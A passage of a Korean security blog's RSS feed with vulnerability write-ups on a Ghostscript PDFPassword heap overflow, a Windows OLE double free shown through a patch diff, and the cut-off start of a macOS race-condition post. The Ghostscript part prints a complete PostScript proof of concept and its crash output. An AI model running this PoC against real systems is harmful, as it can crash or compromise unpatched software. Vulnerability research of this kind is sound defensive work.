&#xAD6C;&#xC131;</strong>&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><strong>2. PDF &#xB370;&#xC774;&#xD130;&#xB97C; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;</strong></p><pre><code class="hljs coffeescript">/OutFile (/tmp/out) (w) file defOutFile Payload writestringOutFile closefile</code></pre><ul><li>&#xC0DD;&#xC131;&#xD55C; PDF &#xB370;&#xC774;&#xD130;&#xB97C; <code>/tmp/out</code> &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</li><li><strong>Ghostscript&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C;, &#xC774; &#xD30C;&#xC77C;&#xC744; &#xD574;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;</strong>&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><strong>3. &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC124;&#xC815; (&#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;)</strong></p><pre><code class="hljs coffeescript">/PDFPassword (hello\<span class="hljs-number">000</span>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB) def</code></pre><ul><li><code>PDFPassword</code>&#xB97C; <strong>&#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC124;&#xC815;</strong>&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB85C; <code>&quot;hello\000BBBB...&quot;</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.<ul><li><code>hello\000</code> &#x2192; <code>&quot;hello&quot;</code> &#xB4A4;&#xC5D0; <strong>NULL &#xBC14;&#xC774;&#xD2B8;(<code>\000</code>)</strong> &#xAC00; &#xD3EC;&#xD568;&#xB428;</li><li><code>BBBB...</code> &#x2192; <strong>&#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070; &#xB370;&#xC774;&#xD130;</strong> (&#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;)</li></ul></li><li>&#xC774; &#xAC12;&#xC740; &#xC774;&#xD6C4; <strong>PDF &#xD574;&#xC11D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>check_password_R5(...)</code> &#xD568;&#xC218;&#xB85C; &#xC804;&#xB2EC;</strong>&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p><strong>4. Ghostscript PDF &#xD574;&#xC11D; &#xC2E4;&#xD589; (&#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;)</strong></p><pre><code class="hljs coffeescript">(/tmp/out) (r) file runpdf</code></pre><ul><li><code>/tmp/out</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <strong>PDF &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;</strong>&#xD558;&#xB3C4;&#xB85D; Ghostscript&#xC5D0;&#xAC8C; &#xBA85;&#xB839;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xC554;&#xD638; &#xD574;&#xB3C5; &#xB85C;&#xC9C1;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA70;, &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><strong>5. PoC &#xC2E4;&#xD589; &#xBC0F; &#xC804;&#xCCB4; &#xCF54;&#xB4DC;</strong></p><ul><li>PoC &#xC2E4;&#xD589;</li></ul><pre><code class="hljs bash">$ ghostscript -dNODISPLAY poc.psGPL Ghostscript 10.02.0 (2023-09-13)Copyright (C) 2023 Artifex Software, Inc.  All rights reserved.This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:see the file COPYING <span class="hljs-keyword">for</span> details.zsh: segmentation fault (core dumped)  ghostscript -dNODISPLAY poc.ps</code></pre><ul><li>&#xC804;&#xCCB4; PoC &#xCF54;&#xB4DC;</li></ul><pre><code class="hljs c">% Simple PDF with R5 encryption.% This is <span class="hljs-keyword">not</span> a very valid PDF but we only need to reach the decryption logic/Payload (%PDF<span class="hljs-number">-1.7</span><span class="hljs-number">1</span> <span class="hljs-number">0</span> obj &lt;&lt; /CF &lt;&lt; /StdCF &lt;&lt; /AuthEvent /DocOpen /CFM /AESV3 /Length <span class="hljs-number">32</span> &gt;&gt; &gt;&gt;/Filter /Standard /Length <span class="hljs-number">256</span>/O &lt;bdc7906c8e8074c880ac23065956c0db6a83d234a942d296364d065edf800b8e32a728ba6916718fbeb70e071a4a33ba&gt;/OE &lt;<span class="hljs-number">7</span>c88773da067c026cc58b5204106d54e320d509ab1d10ac3251f7a14e60d6970&gt;/P <span class="hljs-number">-1028</span> /Perms &lt;<span class="hljs-number">1b</span>6bd44c023964a469d801f598c8d5c4&gt; /R <span class="hljs-number">5</span> /StmF /StdCF /StrF /StdCF/U &lt;<span class="hljs-number">338</span>dc89fb4a90d45cacf91298759e015a6fb0d3f132af0e6970a0079af12054554e7ab059c5392f9abce8a329b2b154b&gt;/UE &lt;<span class="hljs-number">0</span>d8b18de820855c5855de2560a81db57bb4674946bdf2b25eb6b901386492bd7&gt; /V <span class="hljs-number">5</span> &gt;&gt;endobj xref <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0000000000</span> <span class="hljs-number">65535</span> f <span class="hljs-number">0000000009</span> <span class="hljs-number">00000</span> n trailer &lt;&lt; /Encrypt <span class="hljs-number">1</span> <span class="hljs-number">0</span> R &gt;&gt; startxref <span class="hljs-number">0</span>) def% Write the PDF data to a temporary file/OutFile (/tmp/out) (w) file defOutFile Payload writestringOutFile closefile% Set the PDFPassword to a buffer whose length is larger than its <span class="hljs-built_in">strlen</span>/PDFPassword (hello\<span class="hljs-number">000B</span>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB) def% Run the PDF interpreter on the file(/tmp/out) (r) file runpdf% &#xC885;&#xB8CC;showpagequit</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29509">https://nvd.nist.gov/vuln/detail/CVE-2024-29509</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Ghostscript/">Ghostscript</category>
      
      <category domain="https://hackyboiz.github.io/tags/PDFPassword/">PDFPassword</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-Buffer-Overflow/">Heap Buffer Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-29509/">CVE-2024-29509</category>
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/12/clalxk/CVE-2024-29509/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-21298: Windows OLE Double Free 취약점</title>
      <link>https://hackyboiz.github.io/2025/02/08/mungsul/2025-02-08/</link>
      <guid>https://hackyboiz.github.io/2025/02/08/mungsul/2025-02-08/</guid>
      <pubDate>Sat, 08 Feb 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/ynwarcs/CVE-2025-21298&quot;&gt;https://</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/ynwarcs/CVE-2025-21298">https://github.com/ynwarcs/CVE-2025-21298</a></li><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21298">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21298</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 Version 1809 affected from 10.0.17763.0 before 10.0.17763.6775</li><li>Windows Server 2019 affected from 10.0.17763.0 before 10.0.17763.6775</li><li>Windows Server 2019 (Server Core installation) affected from 10.0.17763.0 before 10.0.17763.6775</li><li>Windows Server 2022 affected from 10.0.20348.0 before 10.0.20348.3091</li><li>Windows 10 Version 21H2 affected from 10.0.19043.0 before 10.0.19044.5371</li><li>Windows 11 version 22H2 affected from 10.0.22621.0 before 10.0.22621.4751</li><li>Windows 10 Version 22H2 affected from 10.0.19045.0 before 10.0.19045.5371</li><li>Windows Server 2025 (Server Core installation) affected from 10.0.26100.0 before 10.0.26100.2894</li><li>Windows 11 version 22H3 affected from 10.0.22631.0 before 10.0.22631.4751</li><li>Windows 11 Version 23H2 affected from 10.0.22631.0 before 10.0.22631.4751</li><li>Windows Server 2022, 23H2 Edition (Server Core installation) affected from 10.0.25398.0 before 10.0.25398.1369</li><li>Windows 11 Version 24H2 affected from 10.0.26100.0 before 10.0.26100.2894</li><li>Windows Server 2025 affected from 10.0.26100.0 before 10.0.26100.2894</li><li>Windows 10 Version 1507 affected from 10.0.10240.0 before 10.0.10240.20890</li><li>Windows 10 Version 1607 affected from 10.0.14393.0 before 10.0.14393.7699</li><li>Windows Server 2016 affected from 10.0.14393.0 before 10.0.14393.7699</li><li>Windows Server 2016 (Server Core installation) affected from 10.0.14393.0 before 10.0.14393.7699</li><li>Windows Server 2008 Service Pack 2 affected from 6.0.6003.0 before 6.0.6003.23070</li><li>Windows Server 2008 Service Pack 2 (Server Core installation) affected from 6.0.6003.0 before 6.0.6003.23070</li><li>Windows Server 2008 Service Pack 2 affected from 6.0.6003.0 before 6.0.6003.23070</li><li>Windows Server 2008 R2 Service Pack 1 affected from 6.1.7601.0 before 6.1.7601.27520</li><li>Windows Server 2008 R2 Service Pack 1 (Server Core installation) affected from 6.1.7601.0 before 6.1.7601.27520</li><li>Windows Server 2012 affected from 6.2.9200.0 before 6.2.9200.25273</li><li>Windows Server 2012 (Server Core installation) affected from 6.2.9200.0 before 6.2.9200.25273</li><li>Windows Server 2012 R2 affected from 6.3.9600.0 before 6.3.9600.22371</li><li>Windows Server 2012 R2 (Server Core installation) affected from 6.3.9600.0 before 6.3.9600.22371</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows OLE &#xC5D0;&#xC11C; Double Free &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. MS Word &#xC640; &#xAC19;&#xC740; OLE&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; MS Office &#xB958;&#xB4E4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xAE30;&#xC5D0; &#xC0C1;&#xB2F9;&#xD788; &#xC601;&#xD5A5;&#xB3C4;&#xAC00; &#xB192;&#xC740; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xBCF4;&#xC5EC;&#xC9C0;&#xB124;&#xC694;.</p><p>OLE (Object Linking and Embedding) &#xB294; Windows &#xC758; &#xAC01;&#xC885; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC774; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xAE30;&#xB2A5; &#xC911;&#xC5D0; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; &#xBB38;&#xC11C; &#xAC04; &#xB370;&#xC774;&#xD130; &#xACF5;&#xC720;&#xB97C; &#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xC774;&#xBBF8;&#xC9C0; &#xD558;&#xB098;&#xAC00; &#xC5EC;&#xB7EC; &#xBB38;&#xC11C; &#xD30C;&#xC77C;&#xC5D0; &#xC0BD;&#xC785;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;. </p><p>&#xC774;&#xBBF8;&#xC9C0;&#xAC00; &#xBCC0;&#xACBD;&#xB41C;&#xB2E4;&#xBA74; &#xC0BD;&#xC785;&#xB41C; &#xBAA8;&#xB4E0; &#xBB38;&#xC11C;&#xB4E4;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xBCC0;&#xACBD;&#xD574;&#xC57C;&#xD574;&#xC11C; &#xC0C1;&#xB2F9;&#xD788; &#xBD88;&#xD3B8;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;, &#xBB38;&#xC11C; &#xD558;&#xB098;&#xC5D0;&#xC11C; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xBCC0;&#xACBD;&#xD574;&#xB3C4; &#xB2E4;&#xB978; &#xBB38;&#xC11C;&#xB4E4;&#xC5D0; &#xB2E4; &#xBC18;&#xC601;&#xB418;&#xAC8C;&#xB054; &#xD558;&#xB294;&#xAC8C; OLE &#xC758; &#xC7A5;&#xC810; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB9CC; &#xC774;&#xB7F0; &#xAC15;&#xB825;&#xD55C; &#xAE30;&#xB2A5; &#xB355;&#xBD84;&#xC5D0; &#xC218; &#xB144;&#xAC04; &#xB9CE;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC774; OLE &#xAE30;&#xB2A5; &#xD1B5;&#xD574; &#xBC1C;&#xACAC;&#xB418;&#xACE4; &#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F622;</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p><code>ole32.dll</code> &#xC758; <code>UtOlePresStmToContentsStm</code> &#xB77C;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xB294;&#xB370;&#xC694;. &#xC774; &#xD568;&#xC218;&#xB294; OlePres &#xC2A4;&#xD2B8;&#xB9BC; &#xB0B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC801;&#xC808;&#xD558;&#xAC8C; &#xBCC0;&#xD658;&#xD574;&#xC11C; <code>CONTENTS</code> &#xB77C;&#xB294; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0; &#xC0BD;&#xC785;&#xD558;&#xAC8C;&#xB054; &#xAD6C;&#xD604;&#xB41C; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB294; 2025&#xB144; 1&#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xB41C; <code>UtOlePresStmToContentsStm</code> &#xD568;&#xC218;&#xB97C; &#xB514;&#xD551;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xC2DC;&#xBA74; <code>CONTENTS</code> &#xC2A4;&#xD2B8;&#xB9BC;&#xC6A9; <code>pstmContents</code> &#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0;&#xC11C; &#xC989;&#xC2DC; &#xD574;&#xC81C;&#xB97C; &#xD558;&#xB294;&#xB370;&#xC694;. <code>OlePres</code> &#xC2A4;&#xD2B8;&#xB9BC;&#xC774; &#xC138;&#xD305;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; <code>OpenStream</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD328;&#xD558;&#xACE0; &#xC774;&#xC5B4;&#xC11C; <code>UtReadOlePresStmHeader</code> &#xD568;&#xC218;&#xB3C4; &#xC2E4;&#xD328;&#xD558;&#xC5EC; <code>pstmContents</code> &#xC774; &#xAC12;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xCC44;&#xB85C; &#xD574;&#xC81C;&#xB97C; &#xD55C; &#xBC88; &#xB354; &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">__int64 __fastcall UtOlePresStmToContentsStm(IStorage *pstg, wchar_t *puiStatus, __int64 a3, unsigned <span class="hljs-keyword">int</span> *lpszPresStm){  struct IStorageVtbl *lpVtbl; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// r14d</span>+ <span class="hljs-keyword">bool</span> IsEnabled; <span class="hljs-comment">// al</span>  IStream *v10; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">bool</span> v11; <span class="hljs-comment">// zf</span>  struct IStorageVtbl *v12; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// ebx</span>  HRESULT v14; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">const</span> wchar_t *v15; <span class="hljs-comment">// rdx</span>  IStream *pstmContents; <span class="hljs-comment">// [rsp+40h] [rbp-19h] BYREF</span>  IStream *pstmOlePres; <span class="hljs-comment">// [rsp+48h] [rbp-11h] BYREF</span>  tagFORMATETC foretc; <span class="hljs-comment">// [rsp+50h] [rbp-9h] BYREF</span>  tagHDIBFILEHDR hdfh; <span class="hljs-comment">// [rsp+70h] [rbp+17h] BYREF</span>  *lpszPresStm = <span class="hljs-number">0</span>;  lpVtbl = pstg-&gt;lpVtbl;  pstmContents = <span class="hljs-number">0</span>LL;  v7 = <span class="hljs-number">1</span>;   <span class="hljs-comment">// &quot;CONTENTS&quot; &#xC2A4;&#xD2B8;&#xB9BC;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; pstmContents &#xC5D0; &#xC800;&#xC7A5;</span>  <span class="hljs-keyword">if</span> ( (lpVtbl-&gt;CreateStream)(pstg, L<span class="hljs-string">&quot;CONTENTS&quot;</span>, <span class="hljs-number">18</span>LL, <span class="hljs-number">0</span>LL, <span class="hljs-number">0</span>, &amp;pstmContents) )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>LL;  <span class="hljs-comment">// pstmContents &#xB97C; &#xC989;&#xC2DC; &#xD574;&#xC81C;.</span>  (pstmContents-&gt;lpVtbl-&gt;Release)(pstmContents);+ IsEnabled = wil::details::FeatureImpl&lt;__WilFeatureTraits_Feature_3047977275&gt;::__private_IsEnabled(&amp;`wil::Feature&lt;__WilFeatureTraits_Feature_3047977275&gt;::GetImpl<span class="hljs-string">&apos;::`2&apos;</span>::impl);+ v10 = pstmContents;+ v11 = !IsEnabled;  v12 = pstg-&gt;lpVtbl;+ <span class="hljs-keyword">if</span> ( !v11 )+   v10 = <span class="hljs-number">0</span>LL;+ pstmContents = v10;  (v12-&gt;DestroyElement)(pstg, L<span class="hljs-string">&quot;CONTENTS&quot;</span>);  v13 = (pstg-&gt;lpVtbl-&gt;OpenStream)(pstg, &amp;OlePres, <span class="hljs-number">0</span>LL, <span class="hljs-number">16</span>LL, <span class="hljs-number">0</span>, &amp;pstmOlePres);  <span class="hljs-keyword">if</span> ( v13 )  {    *lpszPresStm |= <span class="hljs-number">1</span>u;    <span class="hljs-keyword">if</span> ( (pstg-&gt;lpVtbl-&gt;OpenStream)(pstg, L<span class="hljs-string">&quot;CONTENTS&quot;</span>, <span class="hljs-number">0</span>LL, <span class="hljs-number">16</span>LL, <span class="hljs-number">0</span>, &amp;pstmContents) )    {      *lpszPresStm |= <span class="hljs-number">2</span>u;    }    <span class="hljs-keyword">else</span>    {      <span class="hljs-comment">// &#xC774;&#xCABD; &#xBD84;&#xAE30;&#xB97C; &#xD0C0;&#xB3C4;&#xB85D; &#xD2B8;&#xB9AC;&#xAC70;</span>      (pstmContents-&gt;lpVtbl-&gt;Release)(pstmContents);+     wil::details::FeatureImpl&lt;__WilFeatureTraits_Feature_3047977275&gt;::__private_IsEnabled(&amp;`wil::Feature&lt;__WilFeatureTraits_Feature_3047977275&gt;::GetImpl<span class="hljs-string">&apos;::`2&apos;</span>::impl);    }    <span class="hljs-keyword">return</span> v13;  }  foretc.ptd = <span class="hljs-number">0</span>LL;  v13 = UtReadOlePresStmHeader(pstmOlePres, &amp;foretc, <span class="hljs-number">0</span>LL, <span class="hljs-number">0</span>LL);  <span class="hljs-keyword">if</span> ( v13 &gt;= <span class="hljs-number">0</span> )  {    v13 = (pstmOlePres-&gt;lpVtbl-&gt;Read)(pstmOlePres, &amp;hdfh, <span class="hljs-number">16</span>LL);    <span class="hljs-keyword">if</span> ( v13 &gt;= <span class="hljs-number">0</span> )    {      v13 = OpenOrCreateStream(pstg, L<span class="hljs-string">&quot;CONTENTS&quot;</span>, &amp;pstmContents);      <span class="hljs-keyword">if</span> ( v13 &lt; <span class="hljs-number">0</span> )      {        *lpszPresStm |= <span class="hljs-number">2</span>u;        <span class="hljs-keyword">goto</span> $errRtn_197;      }      <span class="hljs-keyword">if</span> ( foretc.dwAspect == <span class="hljs-number">4</span> )      {        *lpszPresStm |= <span class="hljs-number">4</span>u;        v7 = <span class="hljs-number">0</span>;        v13 = <span class="hljs-number">0</span>;        <span class="hljs-keyword">goto</span> $errRtn_197;      }      <span class="hljs-keyword">if</span> ( foretc.cfFormat == <span class="hljs-number">8</span> )      {        v14 = UtDIBStmToDIBFileStm(pstmOlePres, hdfh.dwSize, pstmContents);LABEL_19:        v13 = v14;        <span class="hljs-keyword">goto</span> $errRtn_197;      }      <span class="hljs-keyword">if</span> ( foretc.cfFormat == <span class="hljs-number">3</span> )      {        v14 = UtMFStmToPlaceableMFStm(pstmOlePres, hdfh.dwSize, hdfh.dwWidth, hdfh.dwHeight, pstmContents);        <span class="hljs-keyword">goto</span> LABEL_19;      }      v13 = <span class="hljs-number">-2147221398</span>;    }  }$errRtn_197:  <span class="hljs-keyword">if</span> ( pstmOlePres )    (pstmOlePres-&gt;lpVtbl-&gt;Release)(pstmOlePres);  <span class="hljs-comment">// pstmContents &#xB0B4; &#xAC12;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xD574;&#xC81C; &#xC9C4;&#xD589;.</span>  <span class="hljs-keyword">if</span> ( pstmContents )    (pstmContents-&gt;lpVtbl-&gt;Release)(pstmContents);  <span class="hljs-keyword">if</span> ( foretc.ptd )    CoTaskMemFree(foretc.ptd);  <span class="hljs-keyword">if</span> ( v13 )  {    v15 = L<span class="hljs-string">&quot;CONTENTS&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_31;  }  <span class="hljs-keyword">if</span> ( v7 )  {    v15 = &amp;OlePres;LABEL_31:    (pstg-&gt;lpVtbl-&gt;DestroyElement)(pstg, v15);  }  <span class="hljs-keyword">return</span> v13;}</code></pre><p>&#xD328;&#xCE58;&#xB41C; &#xB77C;&#xC778;&#xC744; &#xBCF4;&#xBA74; IsEnabled &#xB77C;&#xB294; flag &#xB97C; &#xD558;&#xB098; &#xCD94;&#xAC00;&#xD574;&#xC11C; <code>pstmContents</code> &#xC758; &#xD574;&#xC81C; &#xC5EC;&#xBD80;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xAC00; &#xB418;&#xC5C8;&#xC73C;&#xBA74; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654; &#xD558;&#xAC8C;&#xB054; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21298">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21298</a></p></li><li><p><a href="https://asec.ahnlab.com/ko/tag/cve-2025-21298-ko/">https://asec.ahnlab.com/ko/tag/cve-2025-21298-ko/</a></p></li><li><p><a href="https://www.offsec.com/blog/cve-2025-21298/">https://www.offsec.com/blog/cve-2025-21298/</a></p></li><li><p><a href="https://github.com/ynwarcs/CVE-2025-21298/blob/main/diff/ole32_dec24.dll-ole32_jan25.dll.ghidriff.md">https://github.com/ynwarcs/CVE-2025-21298/blob/main/diff/ole32_dec24.dll-ole32_jan25.dll.ghidriff.md</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Double-Free/">Double-Free</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/08/mungsul/2025-02-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-24118: macOS의 race condition으로 인한 임의 credential 획득 가능 취약점</title>
      <link>https://hackyboiz.github.io/2025/02/05/OUYA77/2025-02-05/</link>
      <guid>https://hackyboiz.github.io/2025/02/05/OUYA77/2025-02-05/</guid>
      <pubDate>Wed, 05 Feb 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://jprx.io/cve-2025-24118/&quot;&gt;https://jprx.io/cve-2025</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jprx.io/cve-2025-24118/">https://jprx.io/cve-2025-24118/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS Sonoma &lt; 14.7.3</li><li>macOS Sequoia &lt; 15.3</li><li>iPadOS &lt; 17.7.4</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MIT CSAIL&#xC758; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC6D0; Joseph Ravichandran(@0xjprx)&#xC5D0; &#xB530;&#xB974;&#xBA74;, Apple&#xC758; macOS &#xCEE4;&#xB110;(XNU)&#xC5D0;&#xC11C; &#xC0C8;&#xB86D;&#xAC8C; &#xBC1C;&#xACAC;&#xB41C; race condition&#xC73C;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xACFC; &#xBA54;&#xBAA8;&#xB9AC; &#xC190;&#xC0C1;&#xC744; &#xC77C;&#xC73C;&#xD0AC; &#xC218; &#xC788;&#xACE0; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xCEE4;&#xB110; &#xC218;&#xC900;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Safe Memory Reclamation (SMR), read-only &#xD398;&#xC774;&#xC9C0; &#xB9E4;&#xD551;, &#xC2A4;&#xB808;&#xB4DC;&#xBCC4; &#xC790;&#xACA9; &#xC99D;&#xBA85;, memcpy &#xC0AC;&#xC6A9; &#xB4F1;&#xC758; &#xC870;&#xD569;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xACB0;&#xAD6D; &#xBB34;&#xB2E8; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xC218;&#xC815;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xB294; race condition&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>1) <strong>Safe Memory Reclamation</strong> </p><p><code>Safe Memory Reclamation</code>&#xC774;&#xB780; <code>lock</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD68C;&#xC218;&#xD558;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; <code>use-after-free</code> &#xACF5;&#xACA9;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; SMR&#xC740; &#xCD5C;&#xADFC;&#xC5D0;&#xC11C;&#xC57C; macOS &#xCEE4;&#xB110;&#xC778; XNU&#xC5D0; &#xC77C;&#xBD80;&#xBD84; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB294;&#xB370;, &#xADF8; &#xC911; &#xD558;&#xB098;&#xAC00; &#xC624;&#xB298; &#xB9D0;&#xC500;&#xB4DC;&#xB9AC;&#xB294; 